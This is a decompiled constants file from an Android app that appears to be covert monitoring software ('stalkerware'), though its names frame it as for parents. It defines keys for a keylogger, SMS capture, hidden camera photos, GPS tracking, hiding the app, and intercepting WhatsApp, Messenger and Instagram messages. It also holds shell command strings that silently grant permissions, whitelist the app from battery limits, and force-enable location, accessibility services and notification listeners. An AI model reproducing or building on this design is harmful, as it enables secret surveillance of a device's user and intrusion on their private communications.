package com.safe.setting.app.utils;

@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000,\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0002\b\u0002\n\u0002\u0010\b\n\u0002\b\u001f\n\u0002\u0010\t\n\u0002\b\u0005\n\u0002\u0018\u0002\n\u0002\b\u000f\b\u00c6\u0002\u0018\u00002\u00020\u0001B\u0007\b\u0002\u00a2\u0006\u0002\u0010\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0006\u001a\u00020\u0007X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\b\u001a\u00020\u0007X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\t\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\n\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u000b\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\f\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\r\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u000e\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u000f\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0010\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0011\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0012\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0013\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0014\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0015\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0016\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0017\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0018\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0019\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u001a\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u001b\u001a\u00020\u0007X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u001c\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u001d\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u001e\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u001f\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010 \u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010!\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\"\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010#\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010$\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010%\u001a\u00020\u0007X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010&\u001a\u00020\'X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010(\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010)\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010*\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010+\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u0011\u0010,\u001a\u00020-\u00a2\u0006\b\n\u0000\u001a\u0004\b.\u0010/R\u000e\u00100\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u00101\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u00102\u001a\u00020\u0007X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u00103\u001a\u00020\u0007X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u00104\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u00105\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u00106\u001a\u00020\u0007X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u00107\u001a\u00020\u0007X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u00108\u001a\u00020\u0007X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u00109\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010:\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010;\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000\u00a8\u0006<"}, d2 = {"Lcom/safe/setting/app/utils/Consts;", "", "()V", "ADDRESS_IMAGE", "", "ADDRESS_PHOTO", "APP_DISABLED", "", "APP_ENABLED", "CHILD_CAPTURE_PHOTO", "CHILD_GPS", "CHILD_NAME", "CHILD_PERMISSION", "CHILD_PHOTO", "CHILD_SERVICE_DATA", "CHILD_SHOW_APP", "COMMAND_ADD_WHITELIST", "COMMAND_ENABLE_ACCESSIBILITY", "COMMAND_ENABLE_ACCESSIBILITY_1", "COMMAND_ENABLE_GPS_PROVIDER", "COMMAND_ENABLE_NETWORK_PROVIDER", "COMMAND_ENABLE_NOTIFICATION_LISTENER", "COMMAND_GRANT_PERMISSION", "COMMAND_TYPE", "DATA", "DEVICE_NAME", "FACEBOOK_MESSENGER_PACK_NAME", "FRONT_FACING_CAMERA", "INSTAGRAM_PACK_NAME", "INTERVAL", "KEY_LOGGER", "KEY_TEXT", "LOCATION", "NOTIFICATION_MESSAGE", "PARAMS", "PERMISSION_USAGE_STATS", "PHOTO", "REAR_FACING_CAMERA", "SIZE_CACHE_FIREBASE", "", "SMS", "SMS_ADDRESS", "SMS_BODY", "TAG", "TEXT", "Ljava/util/regex/Pattern;", "getTEXT", "()Ljava/util/regex/Pattern;", "TIMER", "TYPE_CHILD", "TYPE_INSTAGRAM", "TYPE_MESSENGER", "TYPE_PARENT", "TYPE_SMS", "TYPE_SMS_INCOMING", "TYPE_SMS_OUTGOING", "TYPE_WHATSAPP", "URL_IMAGE", "USER", "WHATSAPP_PACK_NAME", "app_release"})
public final class Consts {
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String TAG = "NewHome";
    public static final long SIZE_CACHE_FIREBASE = 50000000L;
    public static final int APP_ENABLED = 1;
    public static final int APP_DISABLED = 2;
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String TYPE_CHILD = "Child";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String TYPE_PARENT = "Parent";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String USER = "user";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String NOTIFICATION_MESSAGE = "notificationsMessages";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String LOCATION = "location";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String DATA = "data";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String SMS = "sms";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String KEY_LOGGER = "keyLogger";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String PHOTO = "photo";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String PARAMS = "params";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String TIMER = "timer";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String INTERVAL = "interval";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String CHILD_PHOTO = "photoUrl";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String CHILD_NAME = "nameChild";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String DEVICE_NAME = "nameDevice";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String CHILD_SHOW_APP = "showApp";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String CHILD_GPS = "gpsEnable";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String CHILD_SERVICE_DATA = "serviceData";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String CHILD_PERMISSION = "permissionEnable";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String ADDRESS_IMAGE = "imageNotification";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String ADDRESS_PHOTO = "photos";
    public static final int REAR_FACING_CAMERA = 0;
    public static final int FRONT_FACING_CAMERA = 1;
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String URL_IMAGE = "urlImage";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String KEY_TEXT = "keyText";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String CHILD_CAPTURE_PHOTO = "capturePhoto";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String COMMAND_TYPE = "commandType";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String TYPE_SMS = "smsType";
    public static final int TYPE_SMS_OUTGOING = 1;
    public static final int TYPE_SMS_INCOMING = 2;
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String SMS_ADDRESS = "smsAddress";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String SMS_BODY = "smsBody";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String FACEBOOK_MESSENGER_PACK_NAME = "com.facebook.orca";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String WHATSAPP_PACK_NAME = "com.whatsapp";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String INSTAGRAM_PACK_NAME = "com.instagram.android";
    public static final int TYPE_MESSENGER = 1;
    public static final int TYPE_WHATSAPP = 2;
    public static final int TYPE_INSTAGRAM = 3;
    @org.jetbrains.annotations.NotNull()
    private static final java.util.regex.Pattern TEXT = null;
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String PERMISSION_USAGE_STATS = "android.permission.PACKAGE_USAGE_STATS";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String COMMAND_GRANT_PERMISSION = "pm grant ";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String COMMAND_ADD_WHITELIST = "dumpsys deviceidle whitelist +";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String COMMAND_ENABLE_GPS_PROVIDER = "settings put secure location_providers_allowed +gps";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String COMMAND_ENABLE_NETWORK_PROVIDER = "settings put secure location_providers_allowed +network";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String COMMAND_ENABLE_ACCESSIBILITY = "settings put secure enabled_accessibility_services ";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String COMMAND_ENABLE_ACCESSIBILITY_1 = "settings put secure accessibility_enabled 1";
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String COMMAND_ENABLE_NOTIFICATION_LISTENER = "cmd notification allow_listener ";
    @org.jetbrains.annotations.NotNull()
    public static final com.safe.setting.app.utils.Consts INSTANCE = null;
    
    private Consts() {
        super();
    }
    
    @org.jetbrains.annotations.NotNull()
    public final java.util.regex.Pattern getTEXT() {
        return null;
    }
}